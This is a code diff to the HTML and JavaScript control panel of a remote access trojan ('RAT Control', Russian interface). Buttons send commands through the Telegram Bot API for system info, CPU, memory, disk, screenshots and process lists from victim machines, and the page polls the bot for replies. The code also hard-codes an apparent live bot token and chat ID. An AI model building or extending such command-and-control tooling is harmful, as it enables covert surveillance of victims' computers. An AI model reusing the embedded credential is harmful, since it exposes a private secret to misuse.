@@ -4,54 +4,145 @@
     <title>RAT Control</title>
     <meta charset="UTF-8">
     <style>
-        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+        body { 
+            font-family: Arial; 
+            padding: 20px; 
+            background: #f0f0f0;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .status {
+            background: #28a745;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin: 20px 0;
+        }
         button { 
-            width: 100%; 
             padding: 15px; 
-            margin: 5px 0; 
             background: #0088cc; 
             color: white; 
             border: none; 
             border-radius: 10px; 
             font-size: 16px;
             cursor: pointer;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+            background: #006699;
         }
         .output { 
             background: white; 
-            padding: 15px; 
+            padding: 20px; 
             border-radius: 10px; 
-            margin-top: 20px; 
-            min-height: 100px;
+            min-height: 200px;
             white-space: pre-wrap;
+            font-family: monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            border: 2px solid #ddd;
+            overflow-y: auto;
+            max-height: 500px;
         }
-        .status {
-            background: #28a745;
-            color: white;
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top-color: #0088cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .message {
             padding: 10px;
+            margin: 5px 0;
             border-radius: 5px;
-            margin: 10px 0;
-            text-align: center;
+        }
+        .message.incoming {
+            background: #e3f2fd;
+            border-left: 4px solid #0088cc;
+        }
+        .message.outgoing {
+            background: #f1f8e9;
+            border-left: 4px solid #4caf50;
+        }
+        .timestamp {
+            color: #666;
+            font-size: 11px;
+            float: right;
         }
     </style>
 </head>
 <body>
     <h1>🤖 RAT CONTROL</h1>
-    <div class="status" id="status">✅ Готов к работе</div>
     
-    <button onclick="sendCommand('info')">📊 Информация</button>
-    <button onclick="sendCommand('screen')">📸 Скриншот</button>
-    <button onclick="sendCommand('processes')">📋 Процессы</button>
-    <button onclick="sendCommand('shutdown')">⏻ Выключить</button>
+    <div class="status" id="status">
+        <span id="statusText">✅ Подключено к боту</span>
+        <span id="loading" style="display: none;" class="loading"></span>
+    </div>
     
-    <div id="output" class="output">Нажмите кнопку...</div>
+    <div class="button-grid">
+        <button onclick="sendCommand('info')">📊 Информация</button>
+        <button onclick="sendCommand('cpu')">⚙️ Процессор</button>
+        <button onclick="sendCommand('ram')">💾 Память</button>
+        <button onclick="sendCommand('disk')">💿 Диск</button>
+        <button onclick="sendCommand('screen')">📸 Скриншот</button>
+        <button onclick="sendCommand('processes')">📋 Процессы</button>
+    </div>
+
+    <div id="output" class="output">
+        <div class="message incoming">
+            👋 Добро пожаловать! Нажмите любую кнопку для начала.
+            <span class="timestamp">только что</span>
+        </div>
+    </div>
 
     <script>
         const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
         const CHAT_ID = 7266658879;
+        let lastUpdateId = 0;
+        let messageHistory = [];
 
+        // Функция добавления сообщения в чат
+        function addMessage(text, type = 'incoming') {
+            const output = document.getElementById('output');
+            const time = new Date().toLocaleTimeString();
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${type}`;
+            
+            // Форматируем текст
+            let formattedText = text;
+            if (text.includes('```')) {
+                formattedText = text.replace(/```/g, '');
+            }
+            
+            messageDiv.innerHTML = `${formattedText.replace(/\n/g, '<br>')}<span class="timestamp">${time}</span>`;
+            output.appendChild(messageDiv);
+            output.scrollTop = output.scrollHeight;
+            
+            messageHistory.push({text, type, time});
+        }
+
+        // Отправка команды
         async function sendCommand(cmd) {
-            document.getElementById('status').innerHTML = '⏳ Отправка...';
-            document.getElementById('output').innerHTML = '⏳ Отправка команды: ' + cmd;
+            addMessage(`➡️ Отправка команды: ${cmd}`, 'outgoing');
+            document.getElementById('statusText').innerText = '⏳ Отправка...';
             
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -65,15 +156,54 @@
                 
                 const data = await response.json();
                 if (data.ok) {
-                    document.getElementById('status').innerHTML = '✅ Команда отправлена';
-                    document.getElementById('output').innerHTML = '✅ Команда отправлена. Ждите ответ в чат...';
+                    document.getElementById('statusText').innerText = '✅ Команда отправлена';
                 } else {
-                    document.getElementById('status').innerHTML = '❌ Ошибка';
+                    document.getElementById('statusText').innerText = '❌ Ошибка отправки';
+                    addMessage(`❌ Ошибка: ${data.description}`, 'incoming');
                 }
             } catch (e) {
-                document.getElementById('status').innerHTML = '❌ ' + e.message;
+                document.getElementById('statusText').innerText = '❌ ' + e.message;
+                addMessage(`❌ Ошибка: ${e.message}`, 'incoming');
             }
         }
+
+        // Получение ответов от бота
+        async function getUpdates() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
+                const data = await response.json();
+                
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        
+                        if (update.message && update.message.text) {
+                            // Проверяем, не наша ли это команда
+                            const isOurCommand = update.message.text.length < 20 && 
+                                                ['info', 'cpu', 'ram', 'disk', 'screen', 'processes'].includes(update.message.text.toLowerCase());
+                            
+                            if (!isOurCommand) {
+                                addMessage(`📩 ${update.message.text}`, 'incoming');
+                                document.getElementById('statusText').innerText = '✅ Новое сообщение';
+                            }
+                        }
+                        
+                        // Обработка фото
+                        if (update.message && update.message.photo) {
+                            addMessage(`📸 Получен скриншот (смотрите в Telegram)`, 'incoming');
+                        }
+                    });
+                }
+            } catch (e) {
+                console.error('Ошибка получения обновлений:', e);
+            }
+        }
+
+        // Запускаем получение обновлений каждые 3 секунды
+        setInterval(getUpdates, 3000);
+        
+        // Приветственное сообщение
+        addMessage('✅ Система готова к работе. Нажмите любую кнопку.', 'incoming');
     </script>
 </body>
 </html>
